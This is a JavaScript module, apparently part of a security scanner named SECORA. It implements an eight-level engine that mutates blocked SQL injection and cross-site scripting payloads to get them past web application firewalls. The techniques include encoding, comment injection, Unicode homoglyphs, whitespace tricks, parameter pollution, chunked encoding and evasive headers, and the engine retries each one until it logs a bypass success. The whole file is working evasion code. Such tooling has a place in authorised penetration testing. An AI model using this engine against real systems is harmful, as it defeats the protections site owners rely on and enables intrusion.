import { logger } from '../utils/logger.js';
import { getEvasionHeaders } from './headerEvasion.js';

/**
 * SECORA Deterministic Payload Mutation Engine
 * Progressively mutates a blocked payload through 8 escalation levels to bypass WAFs.
 */

// Level 1: URL Encode
const urlEncode = (payload) => encodeURIComponent(payload);

// Level 2: Double URL Encode
const doubleUrlEncode = (payload) => encodeURIComponent(encodeURIComponent(payload));

// Level 3: Case Variation (Randomized but deterministic for the specific payload)
const caseVariation = (payload) => {
    let result = '';
    for (let i = 0; i < payload.length; i++) {
        const char = payload[i];
        if (/[a-zA-Z]/.test(char)) {
            result += i % 2 === 0 ? char.toUpperCase() : char.toLowerCase();
        } else {
            result += char;
        }
    }
    return result;
};

// Level 4: Comment Injection (e.g., OR 1=1 -> OR/**/1=1, <script> -> <scr<!---->ipt>)
const commentInjection = (payload) => {
    let mutated = payload.replace(/(\s+)/g, '/**/');
    if (mutated.includes('<script>')) mutated = mutated.replace(/<script>/gi, '<scr<!---->ipt>');
    if (mutated.includes('SELECT')) mutated = mutated.replace(/SELECT/gi, 'SEL/**/ECT');
    return mutated;
};

// Level 5: Unicode Normalization (e.g., < -> ＜, s -> ѕ)
const unicodeNormalize = (payload) => {
    const map = { '<': '＜', '>': '＞', "'": '＇', '"': '＂', 's': 'ѕ', 'e': 'е', 'a': 'а', 'o': 'о' };
    let result = '';
    for (const char of payload) {
        result += map[char] || char;
    }
    return result;
};

// Level 6: Whitespace Substitution
const whitespaceSubstitution = (payload) => {
    const spaces = ['%09', '%0A', '%0D', '%0B', '%0C'];
    const randomSpace = () => spaces[Math.floor(Math.random() * spaces.length)];
    return payload.replace(/ /g, randomSpace());
};

// Level 7: HTTP Parameter Pollution (HPP)
// This is handled at the request construction level, so the payload here is just split
// For example, if it's an SQLi, we return a special object that the request dispatcher understands
const parameterPollution = (payload) => {
    const half = Math.floor(payload.length / 2);
    return { 
        isHpp: true, 
        part1: payload.substring(0, half), 
        part2: payload.substring(half) 
    };
};

// Level 8: Chunked Encoding
// Similarly handled at request level
const chunkedEncodingMarker = (payload) => {
    return {
        isChunked: true,
        payload: payload
    };
};

const MUTATION_LEVELS = [
    { level: 1, name: 'URL Encoding', mutate: urlEncode },
    { level: 2, name: 'Double URL Encoding', mutate: doubleUrlEncode },
    { level: 3, name: 'Case Variation', mutate: caseVariation },
    { level: 4, name: 'Comment Injection', mutate: commentInjection },
    { level: 5, name: 'Unicode Normalization', mutate: unicodeNormalize },
    { level: 6, name: 'Whitespace Substitution', mutate: whitespaceSubstitution },
    { level: 7, name: 'HTTP Parameter Pollution', mutate: parameterPollution },
    { level: 8, name: 'Chunked Transfer Encoding', mutate: chunkedEncodingMarker }
];

/**
 * Wraps a vulnerability test request in an evasion loop.
 * 
 * @param {string} originalPayload The base payload
 * @param {Function} requestFn Async function that takes (payload, customHeaders, requestOptions) and returns the response
 * @param {boolean} aggressive Whether to escalate all the way to Level 8
 * @param {string} targetUrl URL for header evasion
 * @returns {Promise<object>} The final response that wasn't blocked (or null if all failed)
 */
export async function sendWithMutations(originalPayload, requestFn, aggressive = false, targetUrl = '') {
    let response = null;
    let isBlocked = false;
    let isFalsePositive = false;

    const evaluateResponse = (res) => {
        const blocked = res && [403, 406, 429, 503].includes(res.status);
        let fp = false;
        if (!blocked && res && res.status === 200) {
            const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
            if (bodyStr.length < 50 || /blocked|forbidden|waf|not acceptable|access denied/i.test(bodyStr)) {
                fp = true;
            }
        }
        return { blocked, fp };
    };

    // Attempt 0: Original payload with standard headers
    try {
        response = await requestFn(originalPayload, {});
        const evalRes = evaluateResponse(response);
        isBlocked = evalRes.blocked;
        isFalsePositive = evalRes.fp;
    } catch (err) {
        if (err.code === 'ECONNRESET' || err.message.includes('socket hang up') || err.message.includes('timeout')) {
            logger.info(`[MutationEngine] WAF dropped connection on initial attempt.`);
            isBlocked = true;
        } else {
            throw err;
        }
    }

    if (!isBlocked && !isFalsePositive && response) return response;

    // Attempt 0.5: Original payload with Evasive Headers
    logger.info(`[MutationEngine] Payload blocked/dropped. Attempting Header Evasion...`);
    const evasiveHeaders = getEvasionHeaders();
    
    try {
        response = await requestFn(originalPayload, evasiveHeaders);
        const evalRes = evaluateResponse(response);
        isBlocked = evalRes.blocked;
        isFalsePositive = evalRes.fp;
    } catch (err) {
        if (err.code === 'ECONNRESET' || err.message.includes('socket hang up') || err.message.includes('timeout')) {
            logger.info(`[MutationEngine] WAF dropped connection on Header Evasion.`);
            isBlocked = true;
        } else {
            throw err;
        }
    }

    if (!isBlocked && !isFalsePositive && response) {
        logger.info(`[MutationEngine] Bypass SUCCESS using Header Evasion.`);
        return response;
    }

    if (!aggressive) {
        logger.debug('[MutationEngine] Aggressive mode disabled. Stopping mutations.');
        return null;
    }

    // Escalate through the 8 mutation levels
    for (const mutation of MUTATION_LEVELS) {
        logger.info(`[MutationEngine] Escaling to Level ${mutation.level}: ${mutation.name}`);
        
        try {
            const mutatedPayload = mutation.mutate(originalPayload);
            
            // Special handling for HPP and Chunked (simulated by passing flags in headers/options for the dispatcher to handle)
            let requestOptions = {};
            let payloadToSent = mutatedPayload;

            if (mutatedPayload && mutatedPayload.isHpp) {
                requestOptions.hpp = true;
                requestOptions.hppParts = mutatedPayload;
                payloadToSent = mutatedPayload.part1; // Just a placeholder, dispatcher uses options
            } else if (mutatedPayload && mutatedPayload.isChunked) {
                requestOptions.chunked = true;
                payloadToSent = mutatedPayload.payload;
            }

            response = await requestFn(payloadToSent, evasiveHeaders, requestOptions);
            isBlocked = response && [403, 406, 429, 503].includes(response.status);
            isFalsePositive = false;
            
            if (!isBlocked && response && response.status === 200) {
                const bodyStr = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');
                if (bodyStr.length < 50 || /blocked|forbidden|waf|not acceptable|access denied/i.test(bodyStr)) {
                    isFalsePositive = true;
                }
            }

            if (!isBlocked && !isFalsePositive) {
                logger.info(`[MutationEngine] Bypass SUCCESS using Level ${mutation.level} (${mutation.name})`);
                // Attach mutation metadata to response so callers know it was evaded
                if (response) {
                    response._evasionLevel = mutation.level;
                    response._evasionName = mutation.name;
                    response._mutatedPayload = mutatedPayload;
                }
                return response;
            }
        } catch (err) {
            // WAFs often drop connections (TCP Reset / Socket Hang Up)
            if (err.code === 'ECONNRESET' || err.message.includes('socket hang up') || err.message.includes('timeout')) {
                logger.info(`[MutationEngine] WAF dropped connection on Level ${mutation.level}. Continuing evasion...`);
            } else {
                logger.warn(`[MutationEngine] Error during Level ${mutation.level}: ${err.message}`);
            }
        }
    }

    logger.warn('[MutationEngine] All 8 mutation levels exhausted. WAF bypass failed.');
    return { _evasionExhausted: true, _evasionLevel: 8, _evasionName: 'Chunked Transfer Encoding' };
}
